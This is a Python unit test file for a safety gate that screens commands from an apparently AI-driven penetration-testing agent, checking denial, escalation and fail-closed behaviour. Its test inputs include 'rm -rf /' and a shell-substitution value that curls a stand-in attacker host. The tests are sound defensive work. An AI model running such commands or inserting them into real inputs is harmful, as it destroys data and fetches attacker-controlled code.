"""Unit tests for the pre-execution safety gate."""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from oubliette_warden.agents.codegen.base import (  # noqa: E402
    AttackTechnique,
    Command,
    ExecutionEnv,
)
from oubliette_warden.agents.codegen.safety_gate import (  # noqa: E402
    GateDecision,
    Verdict,
    evaluate,
    _stage_llm_judge,
    _stage_rag_guard,
)


def _cmd(
    *,
    adapter: str = "nmap",
    argv: list[str] | None = None,
    impact: bool = False,
    runtime: int = 60,
    targets: list[str] | None = None,
) -> Command:
    return Command(
        adapter_name=adapter,
        argv=argv if argv is not None else ["nmap", "-sV", "10.0.0.1"],
        target_scope=targets if targets is not None else ["10.0.0.1"],
        attck_tactics=[AttackTechnique.IMPACT] if impact else [AttackTechnique.RECONNAISSANCE],
        attck_technique_ids=["T1499"] if impact else ["T1595"],
        is_active_probe=True,
        expected_runtime_seconds=runtime,
        rationale="test",
    )


def test_well_formed_command_still_escalates_pending_llm_judge():
    """CRIT-3: llm_judge is a fail-closed stub (no real integration yet), so
    even a structurally well-formed command must ESCALATE, never silently
    auto-APPROVE, until a real judge is wired in."""
    decision = evaluate(_cmd(), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.ESCALATE
    # every deterministic stage before/after llm_judge still APPROVEs; only
    # llm_judge itself is responsible for the ESCALATE.
    by_stage = {s.stage: s.verdict for s in decision.stages}
    assert by_stage["pre_filter"] == Verdict.APPROVE
    assert by_stage["pattern_detector"] == Verdict.APPROVE
    assert by_stage["rag_guard"] == Verdict.APPROVE
    assert by_stage["llm_judge"] == Verdict.ESCALATE
    assert by_stage["mcp_guard"] == Verdict.APPROVE


def test_denies_non_caldera_env():
    decision = evaluate(_cmd(), ExecutionEnv.LIVE)
    assert decision.final == Verdict.DENY
    assert any("CALDERA_ONLY" in s.reason for s in decision.stages)


def test_denies_impact_class():
    decision = evaluate(_cmd(impact=True), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.DENY
    assert any("Impact" in s.reason for s in decision.stages)


def test_denies_empty_argv():
    decision = evaluate(_cmd(argv=[]), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.DENY


def test_denies_empty_target_scope():
    decision = evaluate(_cmd(targets=[]), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.DENY


def test_denies_dangerous_substring():
    decision = evaluate(
        _cmd(argv=["bash", "-c", "rm -rf /"]),
        ExecutionEnv.CALDERA_ONLY,
    )
    assert decision.final == Verdict.DENY
    assert any("forbidden token" in s.reason for s in decision.stages)


def test_denies_shell_substitution():
    decision = evaluate(
        _cmd(argv=["nmap", "$(curl evil.example)"]),
        ExecutionEnv.CALDERA_ONLY,
    )
    assert decision.final == Verdict.DENY


def test_escalates_unknown_adapter():
    decision = evaluate(_cmd(adapter="rogue_tool"), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.ESCALATE
    assert any(s.stage == "rag_guard" for s in decision.stages)


def test_escalates_long_runtime():
    decision = evaluate(_cmd(runtime=3600), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.ESCALATE


def test_short_circuits_on_first_deny():
    decision = evaluate(_cmd(targets=[]), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.DENY
    # pre_filter denies, so we should NOT have reached the later stages
    stages_run = {s.stage for s in decision.stages}
    assert stages_run == {"pre_filter"}


def test_decision_records_all_stages_when_approving():
    decision = evaluate(_cmd(), ExecutionEnv.CALDERA_ONLY)
    stages_run = [s.stage for s in decision.stages]
    assert stages_run == ["pre_filter", "pattern_detector", "rag_guard", "llm_judge", "mcp_guard"]
    assert isinstance(decision, GateDecision)


# ---------- CRIT-3: stub gate stages must fail closed, never silently APPROVE ----------


def test_llm_judge_stub_returns_escalate_not_approve():
    """The llm_judge stage has no real integration yet (Phase I stub). It must
    never silently APPROVE; ESCALATE routes it to operator review instead."""
    result = _stage_llm_judge(_cmd(), ExecutionEnv.CALDERA_ONLY)
    assert result.verdict == Verdict.ESCALATE
    assert result.stage == "llm_judge"
    assert "not implemented" in result.reason or "fail" in result.reason.lower()


def test_llm_judge_stub_escalates_even_impact_free_command():
    """A command with no other red flags at all still can't bypass the stub."""
    decision = evaluate(_cmd(impact=False, runtime=5), ExecutionEnv.CALDERA_ONLY)
    assert decision.final == Verdict.ESCALATE
    assert any(s.stage == "llm_judge" and s.verdict == Verdict.ESCALATE for s in decision.stages)


def test_rag_guard_unknown_adapter_is_fail_closed_escalate():
    """Regression guard: rag_guard's stub must ESCALATE (never APPROVE) an
    adapter that isn't on the Phase I known-good list."""
    result = _stage_rag_guard(_cmd(adapter="totally-unvetted-tool"), ExecutionEnv.CALDERA_ONLY)
    assert result.verdict == Verdict.ESCALATE


def test_rag_guard_known_adapters_still_approve():
    """Sanity: the fail-closed tightening must not regress the known-good list."""
    for name in ("nmap", "msf-aux"):
        result = _stage_rag_guard(_cmd(adapter=name), ExecutionEnv.CALDERA_ONLY)
        assert result.verdict == Verdict.APPROVE
